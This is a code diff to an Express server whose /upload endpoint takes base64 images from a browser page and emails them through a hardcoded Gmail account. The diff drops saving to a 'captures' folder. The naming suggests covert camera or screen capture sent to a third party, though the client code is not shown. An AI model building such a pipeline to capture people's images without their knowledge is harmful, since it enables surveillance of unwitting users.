@@ -1,6 +1,5 @@
 // server.js
 import express from "express";
-import fs from "fs";
 import path from "path";
 import nodemailer from "nodemailer";
 import bodyParser from "body-parser";
@@ -8,9 +7,6 @@ import fetch from "node-fetch";
 
 const app = express();
 const __dirname = path.resolve();
-
-const SAVE_DIR = path.join(__dirname, "captures");
-if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR);
 
 // Email config
 const SENDER_EMAIL = "nothingisimpossiblebrother@gmail.com";  // اپنی سینڈر ای میل
@@ -26,7 +22,7 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// Upload endpoint
+// Upload endpoint (direct email, no file save)
 app.post("/upload", async (req, res) => {
   try {
     const imgData = req.body.image || "";
@@ -37,11 +33,8 @@ app.post("/upload", async (req, res) => {
     }
 
     const imgBuffer = Buffer.from(base64Match[1], "base64");
-    const filename = `cap_${fs.readdirSync(SAVE_DIR).length}.png`;
-    const filePath = path.join(SAVE_DIR, filename);
-    fs.writeFileSync(filePath, imgBuffer);
 
-    // Email send
+    // Email send (no file save, attach buffer directly)
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
@@ -58,14 +51,14 @@ app.post("/upload", async (req, res) => {
         text: "New image attached.",
         attachments: [
           {
-            filename: filename,
-            path: filePath,
+            filename: `capture.png`,
+            content: imgBuffer, // ← direct buffer attach
           },
         ],
       });
     }
 
-    res.json({ status: "ok", saved: filename, sent_to: RECIPIENTS.length });
+    res.json({ status: "ok", sent_to: RECIPIENTS.length });
   } catch (err) {
     res.status(500).json({ status: "error", msg: err.message });
   }
